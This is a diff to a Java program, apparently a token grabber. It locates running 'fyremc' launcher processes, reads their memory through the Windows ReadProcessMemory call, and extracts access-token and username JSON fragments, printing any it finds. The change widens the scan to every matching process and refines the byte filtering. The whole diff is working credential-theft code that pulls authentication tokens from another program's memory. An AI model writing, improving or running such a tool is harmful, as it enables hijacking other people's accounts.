@@ -5,7 +5,9 @@ import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMAT
 import jdk.incubator.foreign.*;
 
 import java.nio.charset.StandardCharsets;
-import java.util.*;
+import java.util.Collections;
+import java.util.Comparator;
+import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -16,32 +18,48 @@ public class Main {
         System.out.println("Porog a fornettigyar");
         ExecutorService executor = Executors.newFixedThreadPool(8);
 
-        Optional<ProcessHandle> process = ProcessHandle.allProcesses()
+        List<ProcessHandle> processes = ProcessHandle.allProcesses()
             .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
-            .min(Comparator.comparingDouble(proc -> proc.info().startInstant().get().getEpochSecond()));
+            .sorted(Comparator.comparingDouble(proc -> proc.info().startInstant().get().getEpochSecond()))
+            .sorted(Collections.reverseOrder()).toList();
 
-        if (process.isEmpty()) {
+        if (processes.isEmpty()) {
             System.out.println("[!] The launcher is not running.");
             return;
         }
 
-        ProcessHandle proc = process.get();
-        executor.execute(() -> {
-            String res = tryFindAccessToken(proc.pid());
-            if (!res.isEmpty()) {
-                System.out.println("[!] Found something in " + proc.pid() + " (P): " + res);
-            }
-        });
+        processes.forEach(proc ->
+            executor.execute(() -> {
+                String res = tryFindAccessToken(proc.pid());
+                if (!res.isEmpty()) {
+                    System.out.println("[!] Found something in " + proc.pid() + " (P): " + res);
+                }
+            })
+        );
         executor.shutdown();
+    }
+
+    public static boolean isByteReadable(byte b) {
+        return b == 34 || b >= 44 && b <= 46 || b >= 48 && b <= 58 || b >= 65 && b <= 90 || b == 95 || b >= 97 && b <= 123 || b == 125;
     }
 
     public static String makeReadable(byte[] buffer) {
         StringBuilder plus = new StringBuilder();
         StringBuilder s = new StringBuilder();
+        int makeSure = 0;
         for (byte a : buffer) {
-            if (a < 5) {
+            if (!isByteReadable(a)) {
+                if (a == 0) {
+                    makeSure++;
+                    if (makeSure == 2){
+                        makeSure = 0;
+                        plus = new StringBuilder();
+                    }
+                    continue;
+                }
                 plus = new StringBuilder();
             } else {
+                makeSure = 0;
                 if (plus.length() < 5) {
                     plus.append((char) a);
                     if (plus.length() == 5) {
@@ -80,24 +98,30 @@ public class Main {
                                 String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
 
                                 boolean runOld;
-                                int offset;
                                 int endIdx;
-                                if ((offset = bufferString.indexOf("{\"access")) > -1) {
-                                    runOld = true;
-                                    endIdx = bufferString.substring(offset).indexOf("}");
-                                } else if ((offset = bufferString.indexOf("{\"username\"")) > -1 && !bufferString.contains(":{\"username\"")) {
+                                int offset = bufferString.indexOf("{");
+
+                                if (offset == -1) {
+                                    continue;
+                                }
+                                String withoutNull = bufferString.substring(offset).replace("\0", "");
+
+                                if (withoutNull.startsWith("{\"usern") && !withoutNull.contains(",\"p") && !withoutNull.contains(",\"h")) {
                                     runOld = false;
                                     endIdx = bufferString.substring(offset).indexOf(",\"s");
+                                } else if ((offset = bufferString.indexOf("{\"acc")) > -1) {
+                                    runOld = true;
+                                    endIdx = bufferString.substring(offset).indexOf("}");
                                 } else {
                                     continue;
                                 }
 
                                 if (endIdx > 0) {
                                     bufferString = makeReadable(buffer.asSlice(offset, endIdx).toByteArray());
+                                    if (bufferString.contains(",\"p") || bufferString.contains(",\"h")) continue;
                                     return bufferString + (runOld ? "}}" : "}");
                                 }
 
-                                buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE);
                                 if (Kernel32.ReadProcessMemory(handle, readPointer.addOffset(offset), buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                     bufferString = makeReadable(buffer.toByteArray());
                                     endIdx = runOld ? bufferString.indexOf("}") : bufferString.indexOf(",\"s");
